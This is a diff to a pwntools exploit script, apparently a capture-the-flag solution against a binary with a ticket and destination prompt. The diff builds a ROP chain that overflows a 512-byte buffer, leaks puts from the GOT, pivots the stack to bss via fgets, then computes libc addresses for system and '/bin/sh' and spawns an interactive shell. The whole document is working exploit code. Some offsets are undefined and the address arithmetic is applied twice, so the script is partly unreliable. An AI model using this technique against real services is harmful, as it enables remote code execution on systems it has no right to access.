@@ -47,12 +47,14 @@ continue
 io = start()
 
 rdi = 0x4012b3
+rsi = 0x4012b1
 gotPuts = 0x404018
 gotSetBuf = 0x404020
 gotPrintf = 0x404028
 gotFgets = 0x404030
 puts = 0x401030
-bss = 0x404250 
+bss = 0x404230
+startBss = 0x404280
 adjust = 0x4012d4 # ret
 tmp = 0x402021 # We are departing
 tmp1 = 0x402004 # What is your destination
@@ -61,6 +63,7 @@ ticket = 0x401191
 init = 0x401215
 leave = 0x401213
 retstart = 0x401070
+fgets = 0x4011eb
 
 dati = 0x404038
 
@@ -72,21 +75,30 @@ nop = asm("nop")
 
 
 # print(0x200)
-payload = flat(rdi, gotPuts, p64(puts), retstart)
+payload = flat(rdi, gotPuts, p64(puts), 
+               rdi, startBss, rsi, 0x600, 0, fgets)
 
-io.sendlineafter(b"> ",  nop * (512 - 8 - len(payload)) + p64(adjust) + payload + p64(bss))
+io.sendafter(b"> ",  b"A" * (512 - 8 - len(payload)) + p64(adjust) + payload + b"\x30\x42\x40\x00\x00\x00\x00")
 
 # print(hex(exe.got['puts']))
 io.recvline() # We are departing
 # sleep(3)
 leakPuts = unpack(io.recvline().strip())
 # leakPrintf = unpack(io.recvline().strip())
-leakSetBuf = unpack(io.recvline().strip())
-leakFgets = unpack(io.recvline().strip())
+# leakSetBuf = unpack(io.recvline().strip())
+# leakFgets = unpack(io.recvline().strip())
 print("puts",hex(leakPuts))
-# print("printf",hex(leakPrintf))
-print("setbuf",hex(leakSetBuf))
-print("fgets",hex(leakFgets))
+
+binsh = (leakPuts - offPuts) + binsh
+system = (leakPuts - offPuts) + system
+
+
+payload = flat((leakPuts - offPuts) + binsh, (leakPuts - offPuts) + system)
+padding = b"A"
+
+# print("Aspetta")
+# sleep(10)
+io.sendline(p64(adjust) * 150 + p64(rdi) + p64(binsh) + p64(system))
 
 io.interactive()
 
